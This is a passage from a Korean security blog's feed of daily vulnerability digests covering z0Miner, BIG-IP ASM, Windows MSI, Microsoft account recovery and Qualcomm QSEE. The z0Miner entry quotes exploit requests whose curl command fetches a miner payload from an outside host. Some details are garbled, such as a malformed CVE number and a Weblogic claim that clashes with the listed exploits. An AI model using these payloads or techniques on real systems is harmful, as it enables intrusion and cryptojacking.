&#xC608;&#xC81C;&#xB294; <code>kernelbase!GetLastError</code>&#xC758; &#xD638;&#xCD9C;&#xC911; &#xB9AC;&#xD134; &#xAC12;&#xC774; 0&#xC774; &#xC544;&#xB2CC; &#xB370;&#xC774;&#xD130;&#xC758; TimeStart&#xAC12;&#xACFC; ReturnValue&#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB3C4;&#xB85D; &#xD544;&#xD130;&#xB9C1;&#xB41C; query&#xC785;&#xB2C8;&#xB2E4;. Select() &#xBA54;&#xC18C;&#xB4DC;&#xB294; &#xAC01; column&#xC758; display name&#xC744; &#xC9C0;&#xC815;&#xD574; &#xC904; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC744; &#xB54C; string &#xAD00;&#xB828; &#xD568;&#xC218;&#xC758; size &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC640; &#xB9AC;&#xD134; &#xAC12;&#xC774; &#xB2E4;&#xB978; &#xD638;&#xCD9C;&#xB9CC; &#xACE8;&#xB77C; &#xBCFC; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC720;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">dx -r2 @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> { Time = c.TimeStart, Error = c.ReturnValue })</code></pre><h2 id="Assigning-query-to-a-variable"><a href="#Assigning-query-to-a-variable" class="headerlink" title="Assigning query to a variable"></a>Assigning query to a variable</h2><p>&#xD2B9;&#xC815; query&#xB97C; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC11C; &#xAE34; query&#xB97C; &#xB9E4;&#xBC88; &#xC785;&#xB825;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">dx -r2 @$myResults = @$cursession.TTD.Calls(<span class="hljs-string">&quot;kernelbase!GetLastError&quot;</span>).Where(c =&gt; c.ReturnValue != <span class="hljs-number">0</span>).Select(c =&gt; <span class="hljs-keyword">new</span> { Time = c.TimeStart, Error = c.ReturnValue })</code></pre><h1 id="&#xB9C8;&#xCE58;&#xBA70;"><a href="#&#xB9C8;&#xCE58;&#xBA70;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;"></a>&#xB9C8;&#xCE58;&#xBA70;</h1><p><img src="/2021/03/14/fabu1ous/ttd-3/14.png" alt></p><p>&#xC774;&#xAC78;&#xB85C; &#x201C;&#xC2DC;&#xAC04;&#xC744; &#xC5EC;&#xD589;&#xD558;&#xB294; &#xD574;&#xCEE4;&#xB97C; &#xC704;&#xD55C; &#xC548;&#xB0B4;&#xC11C;&#x201D; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88;&#xC5D0; TTD&#xB85C; &#xBC84;&#xADF8; &#xBC14;&#xC6B4;&#xD2F0; &#xD558;&#xBA74;&#xC11C; &#xB290;&#xB080; &#xAC74;&#xB370; TTD &#xC5C6;&#xC73C;&#xBA74; &#xB354; &#xC774;&#xC0C1; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xBABB;&#xD558;&#xB294; &#xBAB8;&#xC774; &#xB3FC;&#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC791;&#xB144;&#xC5D4; TTD &#xC5C6;&#xC774; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xD55C; &#xAC70;&#xC9C0;? &#xC624;&#xD788;&#xB824; &#xADF8;&#xB54C; &#xB354; &#xB9AC;&#xBC84;&#xC2F1;&#xC744; &#xC798;&#xD588;&#xB358; &#xAC70; &#xAC19;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;;; &#xC544;&#xBB34;&#xD2BC; &#xADF8;&#xB9CC;&#xD07C; TTD&#xAC00; &#xC88B;&#xB2E4;!&#xB77C;&#xACE0; &#xACB0;&#xB860; &#xC9D3;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC820; &#xC9C4;&#xC9DC; &#xC775;&#xC2A4; &#xD558;&#xB7EC; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windbg</tag>
      
      <tag>time travel debugging</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] z0Miner: Mining Botnet Spreading quickly</title>
    <link href="/2021/03/13/fabu1ous/2021-03-13/"/>
    <url>/2021/03/13/fabu1ous/2021-03-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://blog.netlab.360.com/threat-alert-z0miner-is-spreading-quickly-by-exploiting-elasticsearch-and-jenkins-vulnerabilities/">Threat Alert: z0Miner Is Spreading quickly by Exploiting ElasticSearch and Jenkins Vulnerabilities</a></p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xCD5C;&#xADFC; &#xBE44;&#xD2B8;&#xCF54;&#xC778;&#xC758; &#xC0C1;&#xC2B9;&#xACFC; &#xD568;&#xAED8; &#xB2E4;&#xC591;&#xD55C; &#xCC44;&#xAD74; &#xBD07;&#xB137; &#xACF5;&#xACA9;&#xC774; &#xB298;&#xC5B4;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB300;&#xBD80;&#xBD84; &#xAC10;&#xC5FC; &#xBC29;&#xC2DD;&#xC744; &#xBC14;&#xAFE8;&#xC744; &#xBFD0; &#xC624;&#xB798;&#xB41C; &#xBD07;&#xB137;&#xC774;&#xBA70; &#xADF8;&#xC911; z0Miner&#xB3C4; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. z0Miner&#xB294; 2&#xAC00;&#xC9C0; Weblogic RCE &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC804;&#xD30C;&#xB429;&#xB2C8;&#xB2E4;. z0Miner&#xB294; &#xC544;&#xB798;  &#xB450; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>&#xB97C; &#xC124;&#xCE58;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><p>ElasticSearch RCE (CVE-2021-2015-1427)</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/{VULN_URI}</span> HTTP/1.1<span class="hljs-attribute">Host</span>: {target}:{port}{...exec(\&quot;curl -fsSL http://27.1.1.34:8080/docs/conf.txt -o /tmp/baby\&quot;)...}</code></pre></li></ol><ol><li><p>Jenkins script console RCE</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/{VULN_URI}</span> HTTP/1.1<span class="hljs-attribute">Host</span>: {target}:{port}curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%22.execute%28%29.text&amp;json=%7B%22script%22%3A+%22println+%5C%22curl+-fsSL+http%3A%2F%2F27.1.1.34:8080%2Fdocs%2Fconf.txt+-o+%2Ftmp%2Fsolr%5C%22.execute%28%29.text%22%2C+%22%22%3A+%22%22%7D&amp;Submit=Run</code></pre></li></ol><p>&#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC124;&#xCE58;&#xB41C; <code>hxxp://27.1.1.34:8080/docs/conf.txt</code>&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB2E4;&#xB978; &#xCC44;&#xAD74; &#xBD07;&#xB137;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xADF8; &#xBD07;&#xB137;&#xC744; &#xC885;&#xB8CC;</li><li>&#xCD94;&#xAC00; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC124;&#xCE58;</li><li>&#xCC44;&#xAD74; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>botnet</tag>
      
      <tag>bitcoin</tag>
      
      <tag>monroe</tag>
      
      <tag>mining</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22992: BIG-IP ASM의 stack buffer overflow 취약점</title>
    <link href="/2021/03/12/l0ch/2021-03-12/"/>
    <url>/2021/03/12/l0ch/2021-03-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2132">F5 Big IP - ASM stack-based buffer overflow in is_hdr_criteria_matches</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>BIG&#x2011;IP Application Security Manager</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google project zero&#xAC00; F5&#xC0AC;&#xC758; &#xC6F9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBC29;&#xD654;&#xBCBD;(WAF) &#xC194;&#xB8E8;&#xC158;&#xC778; BIG-IP ASM&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xD55C; stack &#xAE30;&#xBC18; buffer overflow &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xAC1C;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>BIG-IP ASM&#xC774; &#xC6F9; &#xBC29;&#xD654;&#xBCBD;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; response &#xD5E4;&#xB354;&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBC31;&#xC5D4;&#xB4DC;&#xC5D0;&#xC11C; &#xBC18;&#xD658;&#xB41C; &#xBAA8;&#xB4E0; HTTP &#xD5E4;&#xB354;&#xAC00; <code>is_hdr_criteria_matches</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-number">01</span>  <span class="hljs-keyword">uint32_t</span> nlen;<span class="hljs-number">02</span>  <span class="hljs-keyword">uint32_t</span> vlen;<span class="hljs-number">03</span>  <span class="hljs-keyword">char</span> buf [<span class="hljs-number">8264</span>];<span class="hljs-number">04</span> <span class="hljs-number">05</span>  nlen = <span class="hljs-number">8192</span>;<span class="hljs-number">06</span>  <span class="hljs-keyword">if</span> (hdr-&gt;nlen &lt;= <span class="hljs-number">8192</span>)<span class="hljs-number">07</span>    nlen = hdr-&gt;nlen; <span class="hljs-number">08</span>  extract_header_item (.., .., .., nlen, buf); <span class="hljs-number">09</span>  vlen = hdr-&gt;vlen;<span class="hljs-number">10</span>  buf[nlen] = <span class="hljs-string">&apos;:&apos;</span>;<span class="hljs-number">11</span>  buf[nlen + <span class="hljs-number">1</span>] = <span class="hljs-string">&apos; &apos;</span>;<span class="hljs-number">12</span>  <span class="hljs-keyword">if</span> (<span class="hljs-number">8190</span>-nlen &lt;= vlen) <span class="hljs-number">13</span>   vlen = <span class="hljs-number">8190</span>-nlen;<span class="hljs-number">14</span>  extract_header_item (.., .., .., vlen, &amp;buf[nlen + <span class="hljs-number">2</span>]); <span class="hljs-number">15</span>  len = nlen + vlen + <span class="hljs-number">2</span>;<span class="hljs-number">16</span>  buf[len] = <span class="hljs-number">0</span>;</code></pre><p>HTTP &#xD5E4;&#xB354; &#xC774;&#xB984;&#xC758; &#xAE38;&#xC774;&#xB97C; &#xCD5C;&#xB300; 8192&#xAE4C;&#xC9C0; <code>nlen</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xAD6C;&#xBD84;&#xC790; <code>:</code> &#xBC0F; &#xACF5;&#xBC31;&#xC744; &#xCD94;&#xAC00;&#xD55C; &#xB4A4; 12&#xBC88;&#xC9F8; &#xC904; <code>if (8190-nlen &lt;= vlen)</code> &#xC870;&#xAC74;&#xBB38;&#xC5D0;&#xC11C; &#xD5E4;&#xB354; &#xAE38;&#xC774;&#xB97C; &#xC81C;&#xD55C;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>nlen</code>&#xC758; &#xAE38;&#xC774;&#xAC00; 8190&#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0; <code>8190-nlen</code>&#xC5D0;&#xC11C; unsigned&#xB85C;&#xC758; &#xC554;&#xC2DC;&#xC801; &#xD615; &#xBCC0;&#xD658;&#xC73C;&#xB85C; &#xC778;&#xD574; underflow &#xB418;&#xC5B4; UINT_MAX&#xC5D0; &#xAC00;&#xAE4C;&#xC6B4; &#xACB0;&#xACFC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xD5E4;&#xB354; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC5D0; &#xC2E4;&#xD328;&#xD558;&#xACE0; <code>extract_header_item</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; stack buffer overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Request smuggling &#xB610;&#xB294; HTTP header injection&#xACFC; &#xAC19;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xD5E4;&#xB354; &#xAE38;&#xC774;&#xB97C; &#xC870;&#xC791;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>integer underflow</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Third-Party products를 활용한 Windows MSI 권한 상승 취약점</title>
    <link href="/2021/03/11/idioth/2021-03-11/"/>
    <url>/2021/03/11/idioth/2021-03-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://improsec.com/tech-blog/the-many-pitfalls-of-windows-msi-privilege-escalation-in-windows-78110server-and-a-range-of-third-party-products">The many pitfalls of Windows MSI - Privilege escalation in Windows 7/8.1/10/Server and a range of third-party products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 7/8.1/10</li><li>Windows Server 2008/2012/2016/2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Windows&#xC758; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC124;&#xCE58;, &#xC720;&#xC9C0;, &#xC81C;&#xAC70;&#xB97C; &#xC704;&#xD55C; &#xC778;&#xC2A4;&#xD1A8;&#xB7EC;&#xC778; MSI&#xC5D0;&#xC11C; &#xC11C;&#xB4DC; &#xD30C;&#xD2F0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xD1B5;&#xD574; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>MSI &#xD328;&#xD0A4;&#xC9C0;&#xAC00; &#xC124;&#xCE58;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xD328;&#xD0A4;&#xC9C0;&#xC758; &#xBCF5;&#xC0AC;&#xBCF8;&#xC740; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xC774;&#xB984;&#xC744; &#xAC16;&#xACE0; &#xC228;&#xAE40; &#xD3F4;&#xB354; <code>C:\Windows\Installer</code>&#xC5D0; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;. &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790;&#xB4E4;&#xC740; <code>msiexec /fa C:\Windows\Installer\&lt;filename&gt;.msi</code> &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC70;&#xB098; &#xAD00;&#xB828;&#xB41C; API/COM &#xD568;&#xC218;&#xB97C; &#xC9C1;&#xC811;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC7AC;&#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xD0A4;&#xC9C0;&#xC5D0; &#xB530;&#xB77C; &#xC7AC;&#xC124;&#xCE58;&#xD560; &#xB54C; <code>NT Authority/SYSTEM</code> &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; MSIEXEC &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC124;&#xCE58;&#xB41C; &#xC11C;&#xB4DC; &#xD30C;&#xD2F0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xC7AC;&#xC124;&#xCE58;&#xD558;&#xB294; &#xB3D9;&#xC548; <code>NT Authority/SYSTEM</code> &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; <code>cmd.exe</code>&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0; &#xC18D;&#xD558;&#xB294; &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>C:\Windows\System32\cmd.exe</code>&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xBCC0;&#xC218; <code>ComSpec</code>&#xC758; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xBA74; <code>NT Authority/SYSTEM</code> &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>ComSpec</code>&#xC5D0; &#xC124;&#xC815;&#xB41C; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/03/11/idioth/2021-03-11/1.png" alt></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>idioth</tag>
      
      <tag>msi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft online service account takeover</title>
    <link href="/2021/03/10/fabu1ous/2021-03-10/"/>
    <url>/2021/03/10/fabu1ous/2021-03-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://thezerohack.com/how-i-might-have-hacked-any-microsoft-account">How I Might Have Hacked Any Microsoft Account</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft &#xACC4;&#xC815;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft &#xACC4;&#xC815;&#xC758; &#xACC4;&#xC815; &#xBCF5;&#xAD6C;(&#xBE44;&#xBC00;&#xBC88;&#xD638; &#xC7AC;&#xC124;&#xC815;) &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; account takeover &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xACE0; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Microsoft &#xACC4;&#xC815;&#xC758; &#xBE44;&#xBC00;&#xBC88;&#xD638;&#xB97C; &#xC7AC;&#xC124;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; email &#xD639;&#xC740; &#xD734;&#xB300;&#xD3F0;&#xC73C;&#xB85C; &#xBCF4;&#xC548; &#xBB38;&#xC790;&#xB97C; &#xBC1B;&#xC544; &#xC785;&#xB825;&#xD558;&#xB294; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xB97C; &#xAC70;&#xCCD0;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548; &#xBB38;&#xC790;&#xB294; 7&#xC790;&#xB9AC; &#xC22B;&#xC790;&#xB85C; &#xCD1D; 10^7 (&#xCC9C;&#xB9CC;) &#xAC1C;&#xC758; &#xACBD;&#xC6B0;&#xC758; &#xC218;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2F9;&#xC5F0;&#xD788; Brute force &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xBCF4;&#xC548; &#xBB38;&#xC790; &#xC778;&#xC99D; &#xC2DC;&#xB3C4; &#xD69F;&#xC218;&#xB97C; &#xC81C;&#xD55C;&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xB7EC; IP&#xB97C; &#xC774;&#xC6A9;&#xD55C; Web Application Race condition&#xC744; &#xD1B5;&#xD574; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; IP &#xC8FC;&#xC18C;&#xB85C;&#xBD80;&#xD130; &#xB3D9;&#xC2DC;&#xC5D0; &#xC778;&#xC99D; request&#xB97C; &#xBCF4;&#xB0B4;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xD1B5;&#xD574; &#xC81C;&#xD55C; &#xD69F;&#xC218;&#xB97C; &#xB118;&#xC5B4;&#xC120; &#xC778;&#xC99D; &#xC2DC;&#xB3C4;&#xB97C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xACF5;&#xACA9;&#xC744; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>Request&#xC758; &#xC554;&#xD638;&#xD654; &#xBC29;&#xC2DD;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC2DD; &#xD544;&#xC694;&#xD568;.</li><li>&#xCDA9;&#xBD84;&#xD55C; &#xAC1C;&#xC218;&#xC758; IP &#xC8FC;&#xC18C;&#xAC00; &#xD544;&#xC694;&#xD568;.</li><li>&#xBAA8;&#xB4E0; request&#xAC00; Microsoft Server&#xC5D0; &#xB3D9;&#xC2DC;&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xC57C; &#xD568;.</li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://thezerohack.com/hack-any-instagram">https://thezerohack.com/hack-any-instagram</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>race condition</tag>
      
      <tag>brute force</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 퀄컴 SoC의 보안 실행 환경 QSEE에서 발견된 4가지 취약점</title>
    <link href="/2021/03/09/l0ch/2021-03-09/"/>
    <url>/2021/03/09/l0ch/2021-03-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://raelize.com/blog/qualcomm-ipq40xx-analysis-of-critical-qsee-vulnerabilities/">Qualcomm IPQ40xx: Analysis of Critical QSEE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Qualcomm IPQ40xx Series</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Linksys, Netgear &#xBC0F; Cisco &#xB4F1; &#xC5EC;&#xB7EC; &#xC81C;&#xC870;&#xC5C5;&#xCCB4;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Qualcomm&#xC758; SoC&#xC778; IPQ40xx &#xC2DC;&#xB9AC;&#xC988; &#xCE69;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xC5EC;&#xB7EC; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD004;&#xCEF4;&#xC740; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC640; &#xC8FC;&#xBCC0; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xC7A5;&#xCE58;&#xC758; &#xC548;&#xC815;&#xC131;&#xC744; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC744; &#xBD84;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>QSEE(Qualcomm Secure Execution Environment) : &#xD004;&#xCEF4;&#xC758; <a href="https://ko.wikipedia.org/wiki/%EC%8B%A0%EB%A2%B0_%EC%8B%A4%ED%96%89_%ED%99%98%EA%B2%BD">Trusted Execution Environment(&#xC2E0;&#xB8B0; &#xC2E4;&#xD589; &#xD658;&#xACBD;)</a>&#xC73C;&#xB85C;, &#xC77C;&#xBC18; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xACFC; &#xACA9;&#xB9AC;&#xB41C; &#xBCF4;&#xC548; &#xC601;&#xC5ED;&#xC774; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC2E4;&#xD589; &#xD658;&#xACBD;&#xC774;&#xBA70; QSEE&#xC640; &#xAD00;&#xB828;&#xB41C; &#xCF54;&#xB4DC; &#xBC0F; &#xB370;&#xC774;&#xD130;&#xB294; REE&#xC5D0;&#xC11C; &#xC561;&#xC138;&#xC2A4;&#xAC00; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li>REE(Rich Execution Environment) : &#xC77C;&#xBC18; &#xC2E4;&#xD589; &#xD658;&#xACBD;</li></ul><h3 id="CVE-2020-11256"><a href="#CVE-2020-11256" class="headerlink" title="CVE-2020-11256"></a>CVE-2020-11256</h3><p>SMC &#xD578;&#xB4E4;&#xB7EC; <code>tzbsp_blow_fuses_and_reset()</code> &#xC740; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xC790; 